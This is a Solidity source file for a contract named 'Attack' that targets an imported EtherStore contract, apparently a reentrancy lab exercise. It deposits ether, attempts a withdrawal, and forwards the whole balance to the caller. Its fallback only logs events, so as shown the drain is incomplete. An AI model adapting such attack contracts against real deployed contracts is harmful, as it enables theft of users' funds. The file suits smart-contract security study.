pragma solidity ^0.8.19;

import "./EtherStore.sol";

// SPDX-License-Identifier: UNLICENSED
contract Attack {
    EtherStore _etherStore;

    event Track(string flag, address from, uint amount);

    function setEtherStore(address _EtherStoreAddress) public{
        _etherStore = EtherStore(_EtherStoreAddress);
    }

    function attackDepositFunds() public payable {
        require(msg.value >= 1 ether);
        _etherStore.depositFunds{value: 0.5 ether}();       
    }

    function attackWithdrawFunds() public payable {
        _etherStore.withdrawFunds(1 ether); // "1 ether" could be automatically converted into unit256 in wei
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback () external payable {
        emit Track("fallback", msg.sender, msg.value);
    }
    receive () external payable {
        emit Track("receive", msg.sender, msg.value);
    }

}